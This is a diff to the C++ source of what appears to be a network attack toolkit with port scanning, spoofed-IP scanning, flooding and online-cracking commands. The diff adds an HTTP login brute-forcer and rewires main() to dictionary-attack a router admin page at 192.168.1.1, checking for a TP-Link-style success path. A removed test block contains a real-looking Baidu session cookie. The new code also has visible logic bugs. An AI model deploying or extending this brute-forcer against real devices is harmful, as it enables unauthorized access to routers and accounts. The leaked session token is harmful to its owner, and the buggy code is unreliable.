@@ -1,10 +1,13 @@
 
+#pragma warning (disable:4786)
+
 #include <math.h>
 #include <stdio.h>
 #include <string.h>
 
 #include "local_network.h"
 #include "network_crack.h"
+#include "network_dictionary.h"
 #include "network_encoder.h"
 #include "network_route.h"
 #include "resolver_express.h"
@@ -29,6 +32,7 @@ enum execute_state {
     EXIT
 };
 
+static void default_crack_dictionary(dictionary& output_dictionary);
 static void default_tcp_scan_fake_ip_(string target_ip,unsigned int target_port,split_block_result fake_ip,string& output_information);
 static void default_tcp_scan_fake_ip(string target_ip,split_block_result fake_ip,string& output_information);
 static void default_tcp_scan_(string target_ip,unsigned int target_port,string& output_information);
@@ -61,7 +65,7 @@ static const string command_arplist("arp"),
                     //  using:flood %ip% [-P:[port1,...]] [-F:[fake_ip1,...]]
                     command_crack("crack"),
                     //  在线破解
-                    //  using:crack %ip% %port% [-D %dictionary_path%] [-E %express%]
+                    //  using:crack %ip% %port% %express% %success_term% [%user_dictionary_path% %password_dictionary_path%]
                     command_tracert("tracert"),
                     //  路由跟踪
                     //  using:tracert %ip%
@@ -173,10 +177,8 @@ static execute_state execute_command(const string command,string& output_result)
                     split_block_result arg_list_(split_block(arg_list_string,","));
 
                     if (!flag.empty() && !arg_list_string.empty()) {
-
                         if (flag_port==flag) {
                             output_result="scan custom port:\r\n";
-
                             for (split_block_result::const_iterator iterator=arg_list_.begin();
                                                                     iterator!=arg_list_.end();
                                                                     ++iterator) {
@@ -222,10 +224,52 @@ static execute_state execute_command(const string command,string& output_result)
                         return OK;
                     }
                 }
-
                 return ERROR;
             } else if (command_flood==split[0]) {
             } else if (command_crack==split[0]) {
+                //  using:crack %ip% %port% %express% %success_term% [%user_dictionary_path% %password_dictionary_path%]
+
+                //  WARNING! 因为%express 没有更好的方式接收用户的表达式输入(比如输入Enter 的时候就会递交
+                //  命令,HTTP 包头里面包含空格),所以这个地方先搁置一下..
+
+                if (5<=result_length && result_length<=7) {
+                    string ip(split[1]);
+                    string port_(split[2]);
+                    string express(split[3]);
+                    string success_term(split[3]);
+                    dictionary crack_dictionary;
+                    unsigned short port=string_to_number(port_);
+
+                    if (7==result_length) {
+                        string user_dictionary_path(split[4]),
+                               password_dictionary_path(split[5]);
+                        resolve_dictionary_open(user_dictionary_path,password_dictionary_path);
+                    } else
+                        return ERROR;
+                    if (5==result_length) {
+                        default_crack_dictionary(crack_dictionary);
+                    }
+
+                    if (-1!=port && check_ip(ip.c_str())) {
+                        crack_index result=network_crack_http(ip,port,crack_dictionary,express,success_term);
+                        output_result="network crack - target:";
+                        output_result+=ip;
+                        output_result+=":";
+                        output_result+=port_;
+                        output_result+="\r\n";
+                        if (result.first.empty() && result.second.empty()) {
+                            output_result+="crack error! no success username and password!\r\n";
+                        } else {
+                            output_result+="username:";
+                            output_result+=result.first;
+                            output_result+="password:";
+                            output_result+=result.second;
+                            output_result+="\r\n";
+                        }
+                        return OK;
+                    }
+                }
+                return ERROR;
             } else if (command_tracert==split[0]) {
                 tracert_list result=scan_icmp_tracert(split[1].c_str());
                 unsigned int tracert_index=0;
@@ -253,10 +297,8 @@ static execute_state execute_command(const string command,string& output_result)
 
                 if (3==result_length) {
                     split_result resolve_arg_list(split_string(split[2],":"));
-
                     if (!resolve_arg_list.second.empty()) {
                         left_move_string(resolve_arg_list.second,1);
-
                         if (flag_port==upper_string(resolve_arg_list.first))
                             port_=resolve_arg_list.second;
                         else if (flag_path==upper_string(resolve_arg_list.first))
@@ -267,7 +309,6 @@ static execute_state execute_command(const string command,string& output_result)
 
                     if (!resolve_arg_list.second.empty()) {
                         left_move_string(resolve_arg_list.second,1);
-
                         if (flag_port==upper_string(resolve_arg_list.first))
                             port_=resolve_arg_list.second;
                         else if (flag_path==upper_string(resolve_arg_list.first))
@@ -278,7 +319,6 @@ static execute_state execute_command(const string command,string& output_result)
 
                     if (!resolve_arg_list.second.empty()) {
                         left_move_string(resolve_arg_list.second,1);
-
                         if (flag_port==upper_string(resolve_arg_list.first))
                             port_=resolve_arg_list.second;
                         else if (flag_path==upper_string(resolve_arg_list.first))
@@ -372,7 +412,7 @@ static execute_state execute_command(const string command,string& output_result)
                 output_result+="洪水攻击主机\r\n";
                 output_result+="using:flood %ip% [-P:[port1,...]] [-F:[fake_ip1,...]]\r\n";
                 output_result+="在线破解\r\n";
-                output_result+="using:crack %ip% %port% [-D %dictionary_path%] [-E %express%]\r\n";
+                output_result+="using:crack %ip% %port% %express% %success_term% [%user_dictionary_path% %password_dictionary_path%]\r\n";
                 output_result+="路由跟踪\r\n";
                 output_result+="using:tracert %ip%\r\n";
                 output_result+="抓取页面\r\n";
@@ -390,8 +430,11 @@ static execute_state execute_command(const string command,string& output_result)
     }
     return ERROR;
 }
-
 void main(int arg_count,char** arg_list) {
+
+
+/*
+
     local_network_init();
 
     if (1==arg_count) {
@@ -420,7 +463,6 @@ void main(int arg_count,char** arg_list) {
                     printf("create bind error!\n");
                     goto EXIT;
                 }
-
                 client_handle=scan_tcp_accept(tcp_handle);
                 if (-1==client_handle) {
                     printf("accept connect error!\n");
@@ -433,7 +475,6 @@ void main(int arg_count,char** arg_list) {
                     printf("create bind error!\n");
                     goto EXIT;
                 }
-
                 client_handle=scan_tcp_accept(tcp_handle);
                 if (-1==client_handle) {
                     printf("accept connect error!\n");
@@ -521,116 +562,42 @@ EXIT:
     local_network_clean();
 
 
-    /* test module -- local_network.cpp scan_tcp.cpp
+*/
+
     local_network_init();
 
-    printf("local_ip:%s\n",local_ip);
-    printf("local_mac:%s\n",local_mac);
-    printf("gateway_ip:%s\n",gateway_ip);
-    printf("gateway_mac:%s\n",gateway_mac);
-/*
-    for (unsigned int index=70;index<=65535;++index) {
-        if (scan_tcp(gateway_ip,index))
-            printf("Port Open:%d\n",index);
-        else
-            printf("Port Down:%d\n",index);
-    }
+    dictionary crack_dictionary;
+    default_crack_dictionary(crack_dictionary);
 
-    scan_tcp_port_information test={0};
-    if (scan_tcp_get_data("192.168.1.1",80,&test))
-        printf("OK\n");
-    else
-        printf("ERROR\n");
-
-    local_network_clean();
-    */
-    /* test module -- resolver_string.cpp
-
-#define TEST_STRING "Hello world!:test"
-
-    printf("find_string:source string:%s output:%d \n",TEST_STRING,find_string(TEST_STRING," "));
-    split_result split(split_string(TEST_STRING,find_string(TEST_STRING," ")));
-    printf("split_string:source string:%s output:left=%s right=%s \n",TEST_STRING,split.first.c_str(),split.second.c_str());
-    string output_string(TEST_STRING);
-    erase_string(output_string,find_string(TEST_STRING,"w"),7);
-    printf("erase_string:source string:%s output:%s \n",TEST_STRING,output_string.c_str());
-    printf("count_string:source string:%s output:%d \n",TEST_STRING,count_string(TEST_STRING,"l"));
-    string output_left_string(TEST_STRING);
-    left_move_string(output_left_string,6);
-    printf("left_move_string:source string:%s output:%s \n",TEST_STRING,output_left_string.c_str());
-    string output_rught_string(TEST_STRING);
-    right_move_string(output_rught_string,6);
-    printf("right_move_string:source string:%s output:%s \n",TEST_STRING,output_rught_string.c_str());
-    printf("separate_string:source string:%s output:%s \n",TEST_STRING,separate_string(TEST_STRING," ","!").c_str());
-
-#define TEST_SPACE_STRING "  TEST  "
-
-    string test_left(TEST_SPACE_STRING);
-    string test_right(TEST_SPACE_STRING);
-    string test(TEST_SPACE_STRING);
-    left_remote_space(test_left);
-    printf("left_remote_space:%s|\n",test_left.c_str());
-    right_remote_space(test_right);
-    printf("right_remote_space:%s|\n",test_right.c_str());
-    left_remote_space(test);
-    right_remote_space(test);
-    printf("all_remote:%s|\n",test.c_str());
-    */
-    /* test module -- resolver_http.cpp 
-
-#define TEST_HTTP "GET /social/api/2.0/topic/info?callback=xnJSONP43195094&app_id=3629560&third_source_id=3629560 HTTP/1.1\r\n" \
-                  "Host: openapi.baidu.com\r\n" \
-                  "Connection: keep-alive\r\n" \
-                  "Accept: *\r\n" \
+#define TEST_LINK "GET http://192.168.1.1:80/ HTTP/1.1\r\n" \
+                  "Host: 192.168.1.1\r\n" \
+                  "Proxy-Connection: keep-alive\r\n" \
+                  "Cache-Control: max-age=0\r\n" \
+                  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" \
                   "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36\r\n" \
-                  "Referer: http://blog.csdn.net/xywlpo/article/details/6458867\r\n" \
+                  "Referer: http://192.168.1.1/\r\n" \
                   "Accept-Encoding: gzip, deflate, sdch\r\n" \
                   "Accept-Language: zh-CN,zh;q=0.8\r\n" \
-                  "Cookie: BIDUPSID=91D3B032890586777BD77FFAEE53BA56; PSTM=1433413904; BDUSS=5PTW1DTVdxNXVGYUp4ZmNZVzRzaUlIWThRakNOcUhLdzhHaDhvdXJuM3A2WjlWQVFBQUFBJCQAAAAAAAAAAAEAAADCMpgaTENhdHJvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOlceFXpXHhVc2; BAIDUID=BFE4E7C0060B706AE31730D400C2233C:FG=1; H_PS_PSSID=12609_14802_1442_14412_14497_14510_14444_14734_12824_10213_12867_14622_13201_14669_12722_14547_14625_14485_11803_13935_14181_10633\r\n" \
+                  "Cookie: a2404_pages=10; a2404_times=5; Authorization=Basic%20base64(admin:%password%)\r\n" \
                   "\r\n" \
                   "\r\n"
 
-    http_packet packet(resolve_http_to_packet(TEST_HTTP));
-    printf("resolve_http_get_element_count element count:%d\n",resolve_http_get_element_count(packet));
-    resolve_http_set_element(packet,HTTP_CONTEXT,"<html>Hello world!</html>");
-    string result(resolve_http_to_string(packet));
-    printf("resolve_http_to_string:\n%s\n",result.c_str());
-    */
-    /* test module -- resolver_html.cpp 
+    crack_index result=network_crack_http("192.168.1.1",80,crack_dictionary,TEST_LINK,"/userRpm/Index.htm");
 
-#define TEST_HTML "<html><body><form method=\"post\" action=\"test.php\"><input type=\"submit\" value=\"\" /></form></body></html>" 
-
-    printf("separate_string:%s\n",separate_string(TEST_HTML,1,4).c_str());
-
-    tag html_tag(resolve_html_to_tag(TEST_HTML));
-    printf("resolve_html_to_tag:%s\n",resolve_html_get_tag_name(html_tag).c_str());
-    printf("resolve_html_get_tag_subtag:\n%s\n",resolve_html_get_tag_subtag(html_tag).c_str());
-    printf("resolve_html_to_string:\n%s\n\n\n",resolve_html_to_string(html_tag).c_str());
-
-    tag body(resolve_html_to_tag(html_tag));
-    printf("resolve_html_to_tag:%s\n",resolve_html_get_tag_name(body).c_str());
-    printf("resolve_html_get_tag_subtag:\n%s\n\n\n",resolve_html_get_tag_subtag(body).c_str());
-    printf("resolve_html_to_string:\n%s\n",resolve_html_to_string(body).c_str());
-
-    tag form(resolve_html_to_tag(body));
-    printf("resolve_html_to_tag:%s\n",resolve_html_get_tag_name(form).c_str());
-    printf("resolve_html_get_tag_subtag:\n%s\n\n\n",resolve_html_get_tag_subtag(form).c_str());
-    printf("resolve_html_to_string:\n%s\n",resolve_html_to_string(form).c_str());
-    unsigned int count=resolve_html_get_tag_element_count(form);
-    printf("resolve_html_get_tag_element_count:%d\n",count);
-    tag_element_list element_list=resolve_html_get_tag_element_list(form);
-    for (unsigned int index=0;index<count;++index)
-        printf("resolve_html_get_tag_element_list:index:%d name:%s value:%s\n",index,element_list[index].c_str(),resolve_html_get_tag_element(form,element_list[index]).c_str());
-    */
-    /* test module -- resolver_express.cpp 
-#define TEST_HTTP "Host: %string%,Connection: keep-alive,Accept: %string%,Cookie: BIDUPSID=91D33;www.baidu.com,TEST_LINK"
-
-    printf("resolve_express_http:\n%s\n",resolve_express_http("accept:%string%,test:123,test2:%value%;fuck,4321").c_str());
-    printf("resolve_express_http:\n%s\n",resolve_express_http(TEST_HTTP).c_str());
-    printf("resolve_express_function:%s\n",resolve_express_function("rnd([rnd([20-40])-rnd([100-200])])").c_str());
+    printf("username=%s password=%s",result.first.c_str(),result.second.c_str());
     
+    local_network_clean();
+}
 
-    network_crack_http("192.168.1.1",80,resolve_dictionary_open("C:\123.txt","C:\123.txt"),"username:%username%,password:%password%","success");*/
+static void default_crack_dictionary(dictionary& output_dictionary) {
+    unsigned int username_count=sizeof(username)/4;
+    unsigned int password_count=sizeof(password)/4;
+
+    for (unsigned int index=0;index<username_count;++index)
+        resolve_dictionary_add_username(output_dictionary,username[index]);
+
+    for (index=0;index<password_count;++index)
+        resolve_dictionary_add_password(output_dictionary,password[index]);
 }
 
 static void default_tcp_scan_(string target_ip,unsigned int target_port,string& output_information) {
